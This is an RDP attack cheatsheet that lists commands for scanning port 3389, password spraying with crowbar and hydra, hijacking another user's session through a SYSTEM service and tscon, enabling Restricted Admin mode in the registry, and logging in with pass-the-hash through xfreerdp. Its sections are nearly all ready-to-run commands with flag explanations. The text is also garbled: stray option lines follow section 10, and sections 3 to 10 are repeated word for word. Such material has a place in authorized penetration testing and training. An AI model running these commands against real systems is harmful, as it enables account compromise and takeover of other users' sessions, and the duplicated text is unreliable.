# RDP Enumeration Cheatsheet

Enumerating RDP (port 3389) service.

## 1. Enumerate RDP Service (nmap)
Scan for RDP service on the default port.
```bash
nmap -Pn -p3389 target.com
```
- `-Pn`: Skips host discovery.
- `-p3389`: Targets RDP default port (TCP/3389).

## 2. RDP Password Spraying (crowbar)
Test a single password against a list of usernames.
```bash
crowbar -b rdp -s target.com/32 -U users.txt -c 'password123'
```
- `-b rdp`: Targets RDP protocol.
- `-s target.com/32`: Target IP or range.
- `-U users.txt`: File with usernames.
- `-c 'password123'`: Password to test.

## 3. RDP Password Spraying (hydra)
Perform password spraying against RDP with a username list.
```bash
hydra -L usernames.txt -p 'password123' target.com rdp
```
- `-L usernames.txt`: File with usernames.
- `-p 'password123'`: Password to test.
- `rdp`: Targets RDP protocol.

## 4. RDP Login (rdesktop)
Connect to RDP server with valid credentials.
```bash
rdesktop -u user -p 'password' target.com
```
- `-u user`: Specify username.
- `-p 'password'`: Specify password.
- `target.com`: Target IP or hostname.

## 5. Query User Sessions (Windows)
List active RDP sessions on a Windows system.
```cmd
query user
```
- Displays usernames, session names, IDs, and states.

## 6. Create Service for SYSTEM Privileges (Windows)
Create a Windows service to run a command as SYSTEM.
```cmd
sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
```
- `sessionhijack`: Service name.
- `binpath=`: Command to execute (e.g., hijack session ID 2).

## 7. Start Service for RDP Session Hijack (Windows)
Start the created service to hijack an RDP session.
```cmd
net start sessionhijack
```
- `sessionhijack`: Name of the service to start.

## 8. Hijack RDP Session (Windows)
Connect to another user’s RDP session with SYSTEM privileges.
```cmd
tscon 2 /dest:rdp-tcp#13
```
- `2`: Target session ID to hijack.
- `/dest:rdp-tcp#13`: Destination session name.

## 9. Enable Restricted Admin Mode (Windows)
Add registry key to allow RDP Pass-the-Hash.
```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```
- `HKLM\...`: Registry path.
- `/t REG_DWORD`: Registry value type.
- `/v DisableRestrictedAdmin`: Key name.
- `/d 0x0`: Value to enable mode.

## 10. RDP Pass-the-Hash (xfreerdp)
Use NTLM hash to connect via RDP.
```bash
xfreerdp /v:target.com /u:user /pth:300FF5E89EF33F83A8146C10F5AB9BB9
```
- `/v:target.com`: Target IP or hostname.
- `/u:user`: Username.
- `/pth:300FF5E89EF33F83A8146C10F5AB9BB9`: NTLM hash.
- `-b rdp`: Targets RDP protocol.
- `-s target.com/32`: Target IP or range.
- `-U users.txt`: File with usernames.
- `-c 'password123'`: Password to test.

## 3. RDP Password Spraying (hydra)
Perform password spraying against RDP with a username list.
```bash
hydra -L usernames.txt -p 'password123' target.com rdp
```
- `-L usernames.txt`: File with usernames.
- `-p 'password123'`: Password to test.
- `rdp`: Targets RDP protocol.

## 4. RDP Login (rdesktop)
Connect to RDP server with valid credentials.
```bash
rdesktop -u user -p 'password' target.com
```
- `-u user`: Specify username.
- `-p 'password'`: Specify password.
- `target.com`: Target IP or hostname.

## 5. Query User Sessions (Windows)
List active RDP sessions on a Windows system.
```cmd
query user
```
- Displays usernames, session names, IDs, and states.

## 6. Create Service for SYSTEM Privileges (Windows)
Create a Windows service to run a command as SYSTEM.
```cmd
sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
```
- `sessionhijack`: Service name.
- `binpath=`: Command to execute (e.g., hijack session ID 2).

## 7. Start Service for RDP Session Hijack (Windows)
Start the created service to hijack an RDP session.
```cmd
net start sessionhijack
```
- `sessionhijack`: Name of the service to start.

## 8. Hijack RDP Session (Windows)
Connect to another user’s RDP session with SYSTEM privileges.
```cmd
tscon 2 /dest:rdp-tcp#13
```
- `2`: Target session ID to hijack.
- `/dest:rdp-tcp#13`: Destination session name.

## 9. Enable Restricted Admin Mode (Windows)
Add registry key to allow RDP Pass-the-Hash.
```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```
- `HKLM\...`: Registry path.
- `/t REG_DWORD`: Registry value type.
- `/v DisableRestrictedAdmin`: Key name.
- `/d 0x0`: Value to enable mode.

## 10. RDP Pass-the-Hash (xfreerdp)
Use NTLM hash to connect via RDP.
```bash
xfreerdp /v:target.com /u:user /pth:300FF5E89EF33F83A8146C10F5AB9BB9
```
- `/v:target.com`: Target IP or hostname.
- `/u:user`: Username.
- `/pth:300FF5E89EF33F83A8146C10F5AB9BB9`: NTLM hash.